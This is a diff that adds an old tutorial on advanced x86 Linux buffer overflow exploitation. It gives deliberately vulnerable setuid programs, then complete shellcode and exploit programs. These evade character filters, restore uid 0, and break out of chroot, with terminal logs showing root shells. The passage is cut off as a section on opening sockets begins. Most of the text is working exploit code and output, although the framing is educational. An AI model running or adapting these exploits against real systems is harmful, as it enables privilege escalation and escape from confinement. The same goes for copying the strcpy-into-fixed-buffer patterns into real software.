@@ -1,0 +1,1443 @@
+ Advanced buffer overflow exploits
+
+
+ Written by Taeho Oh ( ohhara@postech.edu )
+----------------------------------------------------------------------------
+Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara
+PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus
+PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug
+----------------------------------------------------------------------------
+
+
+1. Introduction
+ Nowadays there are many buffer overflow exploit codes. The early buffer
+overflow exploit codes only spawn a shell ( execute /bin/sh ). However,
+nowadays some of the buffer overflow exploit codes have very nice features.
+For example, passing through filtering, opening a socket, breaking chroot,
+and so on. This paper will attempt to explain the advanced buffer overflow
+exploit skill under intel x86 linux.
+
+2. What do you have to know before reading?
+ You have to know assembly language, C language, and Linux. Of course, you
+have to know what buffer overflow is. You can get the information of the
+buffer overflow in phrack 49-14 ( Smashing The Stack For Fun And Profit
+by Aleph1 ). It is a wonderful paper of buffer overflow and I highly recommend
+you to read that before reading this one.
+
+3. Pass through filtering
+ There are many programs which has buffer overflow problems. Why are not the
+all buffer overflow problems exploited? Because even if a program has a buffer
+overflow condition, it can be hard to exploit. In many cases, the reason is
+that the program filters some characters or converts characters into other
+characters. If the program filters all non printable characters, it's too
+hard to exploit. If the program filters some of characters, you can pass
+through the filter by making good buffer overflow exploit code. :)
+
+3.1 The example vulnerable program
+
+vulnerable1.c
+----------------------------------------------------------------------------
+#include<string.h>
+#include<ctype.h>
+
+int main(int argc,int **argv)
+{
+	char buffer[1024];
+	int i;
+	if(argc>1)
+	{
+		for(i=0;i<strlen(argv[1]);i++)
+			argv[1][i]=toupper(argv[1][i]);
+		strcpy(buffer,argv[1]);
+	}
+}
+----------------------------------------------------------------------------
+
+ This vulnerable program converts small letters into capital letters of the
+user input. Therefore, you have to make a shellcode which doesn't contain any
+small letters. How can you do that? You have to reference the character string
+"/bin/sh" which must contain small letters. However, you can exploit this. :)
+
+3.2 Modify the normal shellcode
+ Almost all buffer overflow exploit code uses this shellcode. Now you have
+to remove all small letters in the shellcode. Of course, the new shellcode
+has to execute a shell.
+
+normal shellcode
+----------------------------------------------------------------------------
+char shellcode[]=
+	"\xeb\x1f"                      /* jmp 0x1f              */
+	"\x5e"                          /* popl %esi             */
+	"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x88\x46\x07"                  /* movb %eax,0x7(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\x89\xd8"                      /* movl %ebx,%eax        */
+	"\x40"                          /* inc %eax              */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\xdc\xff\xff\xff"          /* call -0x24            */
+	"/bin/sh";                      /* .string \"/bin/sh\"   */
+----------------------------------------------------------------------------
+
+ This shellcode has 6 small letters. ( 5 small letters in the "/bin/sh" and
+1 small letter in "movl %esi,0x8(%esi)" )
+ You cannot use "/bin/sh" character string directly to pass through the
+filter. However, you can insert any characters except for small characters.
+Therefore, you can insert "\x2f\x12\x19\x1e\x2f\x23\x18" instead of
+"\x2f\x62\x69\x6e\x2f\x73\x68" ( "/bin/sh" ). After you overflow the buffer
+, you have to change "\x2f\x12\x19\x1e\x2f\x23\x18" into
+"\x2f\x62\x69\x6e\x2f\x73\x68" to execute "/bin/sh". You can change easily
+by adding \x50 to \x62, \x69, \x6e, \x73, and \x68 when your shellcode
+is executed. Then how can you hide \x76 in "movl %esi,0x8(%esi)" ? You
+can change "movl %esi,0x8(%esi)" into other instructions that do the equivalent
+instruction and do not contain any small letters. For example, 
+"movl %esi,0x8(%esi)" can be changed into "movl %esi,%eax", "addl $0x8,%eax",
+"movl %eax,0x8(%esi)". The changed instructions have any small letters.
+( I think other good instructions to do same thing. It's just an example. )
+Now the new shellcode is made.
+
+new shellcode
+----------------------------------------------------------------------------
+char shellcode[]=
+	"\xeb\x38"                      /* jmp 0x38              */
+	"\x5e"                          /* popl %esi             */
+	"\x80\x46\x01\x50"              /* addb $0x50,0x1(%esi)  */
+	"\x80\x46\x02\x50"              /* addb $0x50,0x2(%esi)  */
+	"\x80\x46\x03\x50"              /* addb $0x50,0x3(%esi)  */
+	"\x80\x46\x05\x50"              /* addb $0x50,0x5(%esi)  */
+	"\x80\x46\x06\x50"              /* addb $0x50,0x6(%esi)  */
+	"\x89\xf0"                      /* movl %esi,%eax        */
+	"\x83\xc0\x08"                  /* addl $0x8,%eax        */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x88\x46\x07"                  /* movb %eax,0x7(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\x89\xd8"                      /* movl %ebx,%eax        */
+	"\x40"                          /* inc %eax              */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\xc3\xff\xff\xff"          /* call -0x3d            */
+	"\x2f\x12\x19\x1e\x2f\x23\x18"; /* .string "/bin/sh"     */
+	                                /* /bin/sh is disguised  */
+----------------------------------------------------------------------------
+
+3.3 Exploit vulnerable1 program
+
+ With this shellcode, you can make an exploit code easily.
+
+exploit1.c
+----------------------------------------------------------------------------
+#include<stdio.h>
+#include<stdlib.h>
+
+#define ALIGN                             0
+#define OFFSET                            0
+#define RET_POSITION                   1024
+#define RANGE                            20
+#define NOP                            0x90
+
+char shellcode[]=
+	"\xeb\x38"                      /* jmp 0x38              */
+	"\x5e"                          /* popl %esi             */
+	"\x80\x46\x01\x50"              /* addb $0x50,0x1(%esi)  */
+	"\x80\x46\x02\x50"              /* addb $0x50,0x2(%esi)  */
+	"\x80\x46\x03\x50"              /* addb $0x50,0x3(%esi)  */
+	"\x80\x46\x05\x50"              /* addb $0x50,0x5(%esi)  */
+	"\x80\x46\x06\x50"              /* addb $0x50,0x6(%esi)  */
+	"\x89\xf0"                      /* movl %esi,%eax        */
+	"\x83\xc0\x08"                  /* addl $0x8,%eax        */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x88\x46\x07"                  /* movb %eax,0x7(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\x89\xd8"                      /* movl %ebx,%eax        */
+	"\x40"                          /* inc %eax              */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\xc3\xff\xff\xff"          /* call -0x3d            */
+	"\x2f\x12\x19\x1e\x2f\x23\x18"; /* .string "/bin/sh"     */
+	                                /* /bin/sh is disguised  */
+
+unsigned long get_sp(void)
+{
+	__asm__("movl %esp,%eax");
+}
+
+main(int argc,char **argv)
+{
+	char buff[RET_POSITION+RANGE+ALIGN+1],*ptr;
+	long addr;
+	unsigned long sp;
+	int offset=OFFSET,bsize=RET_POSITION+RANGE+ALIGN+1;
+	int i;
+
+	if(argc>1)
+		offset=atoi(argv[1]);
+
+	sp=get_sp();
+	addr=sp-offset;
+
+	for(i=0;i<bsize;i+=4)
+	{
+		buff[i+ALIGN]=(addr&0x000000ff);
+		buff[i+ALIGN+1]=(addr&0x0000ff00)>>8;
+		buff[i+ALIGN+2]=(addr&0x00ff0000)>>16;
+		buff[i+ALIGN+3]=(addr&0xff000000)>>24;
+	}
+
+	for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
+		buff[i]=NOP;
+
+	ptr=buff+bsize-RANGE*2-strlen(shellcode)-1;
+	for(i=0;i<strlen(shellcode);i++)
+		*(ptr++)=shellcode[i];
+
+	buff[bsize-1]='\0';
+
+	printf("Jump to 0x%08x\n",addr);
+
+	execl("./vulnerable1","vulnerable1",buff,0);
+}
+----------------------------------------------------------------------------
+
+exploit the vulnerable1 program
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ ls -l vulnerable1
+-rwsr-xr-x   1 root     root         4342 Oct 18 13:20 vulnerable1*
+[ ohhara@ohhara ~ ] {2} $ ls -l exploit1
+-rwxr-xr-x   1 ohhara   cse          6932 Oct 18 13:20 exploit1*
+[ ohhara@ohhara ~ ] {3} $ ./exploit1
+Jump to 0xbfffec64
+Segmentation fault
+[ ohhara@ohhara ~ ] {4} $ ./exploit1 500
+Jump to 0xbfffea70
+bash# whoami
+root
+bash#
+----------------------------------------------------------------------------
+
+3.4 What can you do with this technique?
+ You can pass through various form filters with this technique. When the
+vulnerable program filter !@#$%^&*(), you can make the new shellcode which
+doesn't contain !@#$%^&*(). However, you will have difficulties in making a
+shellcode, if the program filters many characters.
+
+4 Change uid back to 0
+ The setuid root program which knows that work with root permission is very
+dangerous calls seteuid(getuid()) at start. And it calls seteuid(0) when it is
+needed. Many programmer thinks that it's safe after calling seteuid(getuid()).
+However, it's not true. The uid can be back to 0.
+
+4.1 The example vulnerable program
+
+vulnerable2.c
+----------------------------------------------------------------------------
+#include<string.h>
+#include<unistd.h>
+
+int main(int argc,char **argv)
+{
+	char buffer[1024];
+	seteuid(getuid());
+	if(argc>1)
+		strcpy(buffer,argv[1]);
+}
+----------------------------------------------------------------------------
+
+ This vulnerable program calls seteuid(getuid()) at start. Therefore, you
+may think that "strcpy(buffer,argv[1]);" is OK. Because you can only get
+your own shell although you succeed in buffer overflow attack. However,
+if you insert a code which calls setuid(0) in the shellcode, you can get
+root shell. :)
+
+4.2 Make setuid(0) code
+
+setuidasm.c
+----------------------------------------------------------------------------
+main()
+{
+	setuid(0);
+}
+----------------------------------------------------------------------------
+
+compile and disassemble
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ gcc -o setuidasm -static setuidasm.c
+[ ohhara@ohhara ~ ] {2} $ gdb setuidasm
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) disassemble setuid
+Dump of assembler code for function __setuid:
+0x804ca00 <__setuid>:   movl   %ebx,%edx
+0x804ca02 <__setuid+2>: movl   0x4(%esp,1),%ebx
+0x804ca06 <__setuid+6>: movl   $0x17,%eax
+0x804ca0b <__setuid+11>:        int    $0x80
+0x804ca0d <__setuid+13>:        movl   %edx,%ebx
+0x804ca0f <__setuid+15>:        cmpl   $0xfffff001,%eax
+0x804ca14 <__setuid+20>:        jae    0x804cc10 <__syscall_error>
+0x804ca1a <__setuid+26>:        ret    
+0x804ca1b <__setuid+27>:        nop    
+0x804ca1c <__setuid+28>:        nop    
+0x804ca1d <__setuid+29>:        nop    
+0x804ca1e <__setuid+30>:        nop    
+0x804ca1f <__setuid+31>:        nop    
+End of assembler dump.
+(gdb)
+----------------------------------------------------------------------------
+
+setuid(0); code
+----------------------------------------------------------------------------
+char code[]=
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\xb0\x17"                      /* movb $0x17,%al        */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+4.3 Modify the normal shellcode
+
+ Making new shellcode is very easy if you make setuid(0) code. Just insert
+the code into the start of the normal shellcode.
+
+new shellcode
+----------------------------------------------------------------------------
+char shellcode[]=
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\xb0\x17"                      /* movb $0x17,%al        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xeb\x1f"                      /* jmp 0x1f              */
+	"\x5e"                          /* popl %esi             */
+	"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x88\x46\x07"                  /* movb %eax,0x7(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\x89\xd8"                      /* movl %ebx,%eax        */
+	"\x40"                          /* inc %eax              */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\xdc\xff\xff\xff"          /* call -0x24            */
+	"/bin/sh";                      /* .string \"/bin/sh\"   */
+----------------------------------------------------------------------------
+
+4.4 Exploit vulnerable2 program
+
+ With this shellcode, you can make an exploit code easily.
+
+exploit2.c
+----------------------------------------------------------------------------
+#include<stdio.h>
+#include<stdlib.h>
+
+#define ALIGN                             0
+#define OFFSET                            0
+#define RET_POSITION                   1024
+#define RANGE                            20
+#define NOP                            0x90
+
+char shellcode[]=
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\xb0\x17"                      /* movb $0x17,%al        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xeb\x1f"                      /* jmp 0x1f              */
+	"\x5e"                          /* popl %esi             */
+	"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x88\x46\x07"                  /* movb %eax,0x7(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\x89\xd8"                      /* movl %ebx,%eax        */
+	"\x40"                          /* inc %eax              */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\xdc\xff\xff\xff"          /* call -0x24            */
+	"/bin/sh";                      /* .string \"/bin/sh\"   */
+
+unsigned long get_sp(void)
+{
+	__asm__("movl %esp,%eax");
+}
+
+void main(int argc,char **argv)
+{
+	char buff[RET_POSITION+RANGE+ALIGN+1],*ptr;
+	long addr;
+	unsigned long sp;
+	int offset=OFFSET,bsize=RET_POSITION+RANGE+ALIGN+1;
+	int i;
+
+	if(argc>1)
+		offset=atoi(argv[1]);
+
+	sp=get_sp();
+	addr=sp-offset;
+
+	for(i=0;i<bsize;i+=4)
+	{
+		buff[i+ALIGN]=(addr&0x000000ff);
+		buff[i+ALIGN+1]=(addr&0x0000ff00)>>8;
+		buff[i+ALIGN+2]=(addr&0x00ff0000)>>16;
+		buff[i+ALIGN+3]=(addr&0xff000000)>>24;
+	}
+
+	for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
+		buff[i]=NOP;
+
+	ptr=buff+bsize-RANGE*2-strlen(shellcode)-1;
+	for(i=0;i<strlen(shellcode);i++)
+		*(ptr++)=shellcode[i];
+
+	buff[bsize-1]='\0';
+
+	printf("Jump to 0x%08x\n",addr);
+
+	execl("./vulnerable2","vulnerable2",buff,0);
+}
+----------------------------------------------------------------------------
+
+exploit the vulnerable2 program
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ ls -l vulnerable2
+-rwsr-xr-x   1 root     root         4258 Oct 18 14:16 vulnerable2*
+[ ohhara@ohhara ~ ] {2} $ ls -l exploit2
+-rwxr-xr-x   1 ohhara   cse          6932 Oct 18 14:26 exploit2*
+[ ohhara@ohhara ~ ] {3} $ ./exploit2
+Jump to 0xbfffec64
+Illegal instruction
+[ ohhara@ohhara ~ ] {4} $ ./exploit2 500
+Jump to 0xbfffea70
+bash# whoami
+root
+bash#
+----------------------------------------------------------------------------
+
+4.5 What can you do with this technique?
+ You attack a setuid root program with buffer overflow but you only get your
+own shell. You can use this technique in that situation.
+
+5 Break chroot
+ If the setuid root program is chrooted, you can access only chrooted
+directory. You cannot access root directory. However, you can access all
+directories, if your shellcode change the root directory into "/" again. :)
+
+5.1 The example vulnerable program
+
+vulnerable3.c
+----------------------------------------------------------------------------
+#include<string.h>
+#include<unistd.h>
+
+int main(int argc,char **argv)
+{
+	char buffer[1024];
+	chroot("/home/ftp");
+	chdir("/");
+	if(argc>1)
+		strcpy(buffer,argv[1]);
+}
+----------------------------------------------------------------------------
+
+ If you tries to execute "/bin/sh" with buffer overflow, it may executes
+"/home/ftp/bin/sh" ( if it exists ) and you cannot access the other directories
+except for "/home/ftp".
+
+5.2 Make break chroot code
+ If you can execute below code, you can break chroot.
+
+breakchrootasm.c
+----------------------------------------------------------------------------
+main()
+{
+	mkdir("sh",0755);
+	chroot("sh");
+	/* many "../" */
+	chroot("../../../../../../../../../../../../../../../../");
+}
+----------------------------------------------------------------------------
+
+ This break chroot code makes "sh" directory, because it's easy to reference.
+( it's also used to execute "/bin/sh" )
+
+compile and disassemble
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ gcc -o breakchrootasm -static breakchrootasm.c
+[ ohhara@ohhara ~ ] {2} $ gdb breakchrootasm
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) disassemble mkdir
+Dump of assembler code for function __mkdir:
+0x804cac0 <__mkdir>:    movl   %ebx,%edx
+0x804cac2 <__mkdir+2>:  movl   0x8(%esp,1),%ecx
+0x804cac6 <__mkdir+6>:  movl   0x4(%esp,1),%ebx
+0x804caca <__mkdir+10>: movl   $0x27,%eax
+0x804cacf <__mkdir+15>: int    $0x80
+0x804cad1 <__mkdir+17>: movl   %edx,%ebx
+0x804cad3 <__mkdir+19>: cmpl   $0xfffff001,%eax
+0x804cad8 <__mkdir+24>: jae    0x804cc40 <__syscall_error>
+0x804cade <__mkdir+30>: ret    
+0x804cadf <__mkdir+31>: nop    
+End of assembler dump.
+(gdb) disassemble chroot
+Dump of assembler code for function chroot:
+0x804cb60 <chroot>:     movl   %ebx,%edx
+0x804cb62 <chroot+2>:   movl   0x4(%esp,1),%ebx
+0x804cb66 <chroot+6>:   movl   $0x3d,%eax
+0x804cb6b <chroot+11>:  int    $0x80
+0x804cb6d <chroot+13>:  movl   %edx,%ebx
+0x804cb6f <chroot+15>:  cmpl   $0xfffff001,%eax
+0x804cb74 <chroot+20>:  jae    0x804cc40 <__syscall_error>
+0x804cb7a <chroot+26>:  ret    
+0x804cb7b <chroot+27>:  nop    
+0x804cb7c <chroot+28>:  nop    
+0x804cb7d <chroot+29>:  nop    
+0x804cb7e <chroot+30>:  nop    
+0x804cb7f <chroot+31>:  nop    
+End of assembler dump.
+(gdb)
+----------------------------------------------------------------------------
+
+mkdir("sh",0755); code
+----------------------------------------------------------------------------
+	/* mkdir first argument is %ebx and second argument is   */
+	/* %ecx.                                                 */
+char code[]=
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\xb0\x17"                      /* movb $0x27,%al        */
+	"\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
+	/* %esi has to reference "/bin/sh" before using this     */
+	/* instruction. This instruction load address of "sh"    */
+	/* and store at %ebx                                     */
+	"\xfe\xc5"                      /* incb %ch              */
+	/* %cx = 0000 0001 0000 0000                             */
+	"\xb0\x3d"                      /* movb $0xed,%cl        */
+	/* %cx = 0000 0001 1110 1101                             */
+	/* %cx = 000 111 101 101                                 */
+	/* %cx = 0   7   5   5                                   */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+chroot("sh"); code
+----------------------------------------------------------------------------
+	/* chroot first argument is ebx */
+char code[]=
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
+	"\xb0\x3d"                      /* movb $0x3d,%al        */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+chroot("../../../../../../../../../../../../../../../../"); code
+----------------------------------------------------------------------------
+char code[]=
+	"\xbb\xd2\xd1\xd0\xff"          /* movl $0xffd0d1d2,%ebx */
+	/* disguised "../" character string                      */
+	"\xf7\xdb"                      /* negl %ebx             */
+	/* %ebx = $0x002f2e2e                                    */
+	/* intel x86 is little endian.                           */
+	/* %ebx = "../"                                          */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\xb1\x10"                      /* movb $0x10,%cl        */
+	/* prepare for looping 16 times.                         */
+	"\x56"                          /* pushl %esi            */
+	/* backup current %esi. %esi has the pointer of          */
+	/* "/bin/sh".                                            */
+	"\x01\xce"                      /* addl %ecx,%esi        */
+	"\x89\x1e"                      /* movl %ebx,(%esi)      */
+	"\x83\xc6\x03"                  /* addl $0x3,%esi        */
+	"\xe0\xf9"                      /* loopne -0x7           */
+	/* make "../../../../ . . . " character string at        */
+	/* 0x10(%esi) by looping.                                */
+	"\x5e"                          /* popl %esi             */
+	/* restore %esi.                                         */
+	"\xb0\x3d"                      /* movb $0x3d,%al        */
+	"\x8d\x5e\x10"                  /* leal 0x10(%esi),%ebx  */
+	/* %ebx has the address of "../../../../ . . . ".        */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+5.3 Modify the normal shellcode
+
+ Making new shellcode is very easy if you make break chroot code. Just insert
+the code into the start of the normal shellcode and modify jmp and call
+argument.
+
+new shellcode
+----------------------------------------------------------------------------
+char shellcode[]=
+	"\xeb\x4f"                      /* jmp 0x4f              */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\x5e"                          /* popl %esi             */
+	"\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
+	"\xb0\x27"                      /* movb $0x27,%al        */
+	"\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
+	"\xfe\xc5"                      /* incb %ch              */
+	"\xb1\xed"                      /* movb $0xed,%cl        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
+	"\xb0\x3d"                      /* movb $0x3d,%al        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\xbb\xd2\xd1\xd0\xff"          /* movl $0xffd0d1d2,%ebx */
+	"\xf7\xdb"                      /* negl %ebx             */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\xb1\x10"                      /* movb $0x10,%cl        */
+	"\x56"                          /* pushl %esi            */
+	"\x01\xce"                      /* addl %ecx,%esi        */
+	"\x89\x1e"                      /* movl %ebx,(%esi)      */
+	"\x83\xc6\x03"                  /* addl %0x3,%esi        */
+	"\xe0\xf9"                      /* loopne -0x7           */
+	"\x5e"                          /* popl %esi             */
+	"\xb0\x3d"                      /* movb $0x3d,%al        */
+	"\x8d\x5e\x10"                  /* leal 0x10(%esi),%ebx  */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\xac\xff\xff\xff"          /* call -0x54            */
+	"/bin/sh";                      /* .string \"/bin/sh\"   */
+----------------------------------------------------------------------------
+
+5.4 Exploit vulnerable3 program
+ With this shellcode, you can make an exploit code easily.
+
+exploit3.c
+----------------------------------------------------------------------------
+#include<stdio.h>
+#include<stdlib.h>
+
+#define ALIGN                             0
+#define OFFSET                            0
+#define RET_POSITION                   1024
+#define RANGE                            20
+#define NOP                            0x90
+
+char shellcode[]=
+	"\xeb\x4f"                      /* jmp 0x4f              */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\x5e"                          /* popl %esi             */
+	"\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
+	"\xb0\x27"                      /* movb $0x27,%al        */
+	"\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
+	"\xfe\xc5"                      /* incb %ch              */
+	"\xb1\xed"                      /* movb $0xed,%cl        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
+	"\xb0\x3d"                      /* movb $0x3d,%al        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\xbb\xd2\xd1\xd0\xff"          /* movl $0xffd0d1d2,%ebx */
+	"\xf7\xdb"                      /* negl %ebx             */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\xb1\x10"                      /* movb $0x10,%cl        */
+	"\x56"                          /* pushl %esi            */
+	"\x01\xce"                      /* addl %ecx,%esi        */
+	"\x89\x1e"                      /* movl %ebx,(%esi)      */
+	"\x83\xc6\x03"                  /* addl %0x3,%esi        */
+	"\xe0\xf9"                      /* loopne -0x7           */
+	"\x5e"                          /* popl %esi             */
+	"\xb0\x3d"                      /* movb $0x3d,%al        */
+	"\x8d\x5e\x10"                  /* leal 0x10(%esi),%ebx  */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\xac\xff\xff\xff"          /* call -0x54            */
+	"/bin/sh";                      /* .string \"/bin/sh\"   */
+
+unsigned long get_sp(void)
+{
+	__asm__("movl %esp,%eax");
+}
+
+void main(int argc,char **argv)
+{
+	char buff[RET_POSITION+RANGE+ALIGN+1],*ptr;
+	long addr;
+	unsigned long sp;
+	int offset=OFFSET,bsize=RET_POSITION+RANGE+ALIGN+1;
+	int i;
+
+	if(argc>1)
+		offset=atoi(argv[1]);
+
+	sp=get_sp();
+	addr=sp-offset;
+
+	for(i=0;i<bsize;i+=4)
+	{
+		buff[i+ALIGN]=(addr&0x000000ff);
+		buff[i+ALIGN+1]=(addr&0x0000ff00)>>8;
+		buff[i+ALIGN+2]=(addr&0x00ff0000)>>16;
+		buff[i+ALIGN+3]=(addr&0xff000000)>>24;
+	}
+
+	for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
+		buff[i]=NOP;
+
+	ptr=buff+bsize-RANGE*2-strlen(shellcode)-1;
+	for(i=0;i<strlen(shellcode);i++)
+		*(ptr++)=shellcode[i];
+
+	buff[bsize-1]='\0';
+
+	printf("Jump to 0x%08x\n",addr);
+
+	execl("./vulnerable3","vulnerable3",buff,0);
+}
+----------------------------------------------------------------------------
+
+exploit the vulnerable3 program
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ ls -l vulnerable3
+-rwsr-xr-x   1 root     root         4348 Oct 18 15:06 vulnerable3*
+[ ohhara@ohhara ~ ] {2} $ ls -l exploit3
+-rwxr-xr-x   1 ohhara   cse          5059 Oct 18 17:13 exploit3*
+[ ohhara@ohhara ~ ] {3} $ ./exploit3
+Jump to 0xbfffec68
+Segmentation fault
+[ ohhara@ohhara ~ ] {4} $ ./exploit3 500
+Jump to 0xbfffea74
+Segmentation fault
+[ ohhara@ohhara ~ ] {5} $ ./exploit3 -500
+Jump to 0xbfffee5c
+bash# whoami
+root
+bash# pwd
+/home/ftp
+bash# cd /
+bash# pwd
+/
+bash# ls
+afs  boot  etc     home  lost+found  mnt   root  tmp  var
+bin  dev   export  lib   misc        proc  sbin  usr
+bash#
+----------------------------------------------------------------------------
+
+5.5 What can you do with this technique?
+ You cannot access root directory by attacking a chrooted setuid program with
+buffer overflow. However, you can access all directories with this technique.
+ 
+6 Open socket
+ You can see the daemon crash if you try to overflow the buffer in a daemon.
+In many cases, you have to execute a shell, open a socket, and connect to
